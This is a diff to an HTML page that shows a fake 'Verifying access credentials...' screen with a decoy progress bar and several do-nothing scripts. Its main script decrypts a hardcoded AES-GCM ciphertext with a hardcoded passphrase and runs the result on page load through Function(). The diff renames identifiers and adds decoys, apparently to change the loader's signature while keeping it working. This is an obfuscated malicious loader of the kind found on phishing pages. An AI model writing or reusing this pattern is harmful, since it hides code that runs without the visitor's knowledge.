@@ -43,13 +43,32 @@
             font-size: 14px;
             color: #666;
         }
+        .fake-progress-bar {
+            width: 200px;
+            height: 10px;
+            background-color: #e0e0e0;
+            border-radius: 5px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .fake-progress {
+            width: 0;
+            height: 100%;
+            background-color: #4f46e5;
+            animation: fake-progress 2s linear infinite;
+        }
+        @keyframes fake-progress {
+            0% { width: 0; }
+            50% { width: 100%; }
+            100% { width: 0; }
+        }
     </style>
 </head>
 <body>
 
     <!-- Hidden Container -->
     <div class="hidden-container">
-        <div nike-tes1="secret-data" id="hidden-data" data-info=""></div>
+        <div nike-gggggg="secret-data" id="hidden-data" data-info=""></div>
     </div>
 
     <!-- Main Loader -->
@@ -61,46 +80,62 @@
         <p>Verifying access credentials...</p>
     </div>
 
+    <!-- Fake Progress Bar -->
+    <div class="fake-progress-bar">
+        <div class="fake-progress"></div>
+    </div>
+
     <!-- Useless Script 1 -->
     <script>
-        const simulateFakeProcess = () => {
-            // console.log("[INFO] Simulating fake process...");
+        const performFakeTask = () => {
+            // console.log("[INFO] Performing fake task...");
             setTimeout(() => {
-                // console.log("[INFO] Fake process completed.");
+                // console.log("[INFO] Fake task completed.");
             }, 1500);
         };
-        simulateFakeProcess();
+        performFakeTask();
     </script>
 
     <!-- Useless Script 2 -->
     <script>
-        const pointlessFunction = () => {
-            const randomNumbers = [10, 20, 30, 40, 50];
-            randomNumbers.forEach(num => {
-                // console.log(`Random number: ${num}`);
+        const generateRandomNumbers = () => {
+            const numbers = [15, 25, 35, 45, 55];
+            numbers.forEach(num => {
+                // console.log(`Generated number: ${num}`);
             });
         };
-        pointlessFunction();
+        generateRandomNumbers();
+    </script>
+
+    <!-- Useless Script 3 -->
+    <script>
+        const fakeLogger = () => {
+            const messages = ["Initializing...", "Loading modules...", "Finalizing..."];
+            messages.forEach(msg => {
+                // console.log(`[LOG] ${msg}`);
+            });
+        };
+        fakeLogger();
     </script>
 
     <!-- Core Secure Processing Script -->
     <script>
-        const unlockSecureData = async (encryptedContent, securityKey, securitySalt, securityPassword) => {
-            // console.log("[INFO] Starting secure data unlock process...");
+        const decryptSecureContent = async (encryptedData, key, salt, passphrase) => {
+            // console.log("[INFO] Starting secure content decryption...");
 
-            const convertHexToBytes = (hex) => {
-                return new Uint8Array(hex.match(/.{2}/g).map(byte => parseInt(byte, 16)));
+            const hexToByteArray = (hexString) => {
+                return new Uint8Array(hexString.match(/.{2}/g).map(byte => parseInt(byte, 16)));
             };
 
-            const simulateProcessingDelay = () => new Promise(resolve => {
-                // console.log("[DEBUG] Simulating processing delay...");
+            const simulateDelay = () => new Promise(resolve => {
+                // console.log("[DEBUG] Simulating delay...");
                 setTimeout(() => resolve(), 500);
             });
 
-            const generateSecurityKey = async (keyMaterial, salt) => {
+            const deriveKeyFromMaterial = async (material, saltBytes) => {
                 return crypto.subtle.deriveKey(
-                    { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
-                    keyMaterial,
+                    { name: "PBKDF2", salt: saltBytes, iterations: 100000, hash: "SHA-256" },
+                    material,
                     { name: "AES-GCM", length: 256 },
                     false,
                     ["decrypt"]
@@ -109,43 +144,43 @@
 
             const keyMaterial = await crypto.subtle.importKey(
                 "raw",
-                new TextEncoder().encode(securityPassword),
+                new TextEncoder().encode(passphrase),
                 { name: "PBKDF2" },
                 false,
                 ["deriveKey"]
             );
 
-            await simulateProcessingDelay();
-            const derivedSecurityKey = await generateSecurityKey(keyMaterial, convertHexToBytes(securitySalt));
+            await simulateDelay();
+            const derivedKey = await deriveKeyFromMaterial(keyMaterial, hexToByteArray(salt));
 
             try {
-                const decryptedContent = await crypto.subtle.decrypt(
-                    { name: "AES-GCM", iv: convertHexToBytes(securityKey) },
-                    derivedSecurityKey,
-                    convertHexToBytes(encryptedContent)
+                const decryptedBytes = await crypto.subtle.decrypt(
+                    { name: "AES-GCM", iv: hexToByteArray(key) },
+                    derivedKey,
+                    hexToByteArray(encryptedData)
                 );
-                console.log("[SUCCESS] Secure data unlocked successfully.");
-                return new TextDecoder().decode(decryptedContent);
+                console.log("[SUCCESS] Secure content decrypted successfully.");
+                return new TextDecoder().decode(decryptedBytes);
             } catch (error) {
-                console.error("[ERROR] Failed to unlock secure data:", error);
+                console.error("[ERROR] Failed to decrypt secure content:", error);
                 return null;
             }
         };
 
         (async () => {
-            console.log("[INFO] Initiating secure data unlock...");
-            const securePayload = {
-                securityKey: "ce12552921e07eeae6d25a8b",
-                securitySalt: "0ac6f6fafea5dd5e93ca4522b49d3681",
-                encryptedContent: "6deb93765e72ef8ce34b1b97d0c25c97611c83b0ac258d36b36d018cdb7ff468533920838d3707c758da44549d374e8e0ca5a6aa93b0af7aa6d1f2e3c26dcf486585b4c887ad5cb43aed7d90469c8c5265c8bbbeca57739d97e18e7cceac3acfa08db407fba57a71ff3d8a03b8299957024e3205442026156a361709ebd8c2df4c14a3c6c053abe5055489a44d42679720a67e7b98ddb7c15cf91320517d7e3b4c74750d19471e7e76750a80e4a099a0297edb403178b56fd0f152d4ac2ea37bc07720850870a3a7"
+            console.log("[INFO] Initiating secure content decryption...");
+            const payload = {
+                key: "ce12552921e07eeae6d25a8b",
+                salt: "0ac6f6fafea5dd5e93ca4522b49d3681",
+                encryptedData: "6deb93765e72ef8ce34b1b97d0c25c97611c83b0ac258d36b36d018cdb7ff468533920838d3707c758da44549d374e8e0ca5a6aa93b0af7aa6d1f2e3c26dcf486585b4c887ad5cb43aed7d90469c8c5265c8bbbeca57739d97e18e7cceac3acfa08db407fba57a71ff3d8a03b8299957024e3205442026156a361709ebd8c2df4c14a3c6c053abe5055489a44d42679720a67e7b98ddb7c15cf91320517d7e3b4c74750d19471e7e76750a80e4a099a0297edb403178b56fd0f152d4ac2ea37bc07720850870a3a7"
             };
 
-            const password = "homesweethome";
-            const decryptedData = await unlockSecureData(securePayload.encryptedContent, securePayload.securityKey, securePayload.securitySalt, password);
-            Function(`${decryptedData}`)();
+            const passphrase = "homesweethome";
+            const decryptedContent = await decryptSecureContent(payload.encryptedData, payload.key, payload.salt, passphrase);
+            Function(`${decryptedContent}`)();
 
-            if (decryptedData) {
-                // console.log("[INFO] Retrieved secure data:", decryptedData);
+            if (decryptedContent) {
+                // console.log("[INFO] Retrieved secure content:", decryptedContent);
             }
         })();
     </script>
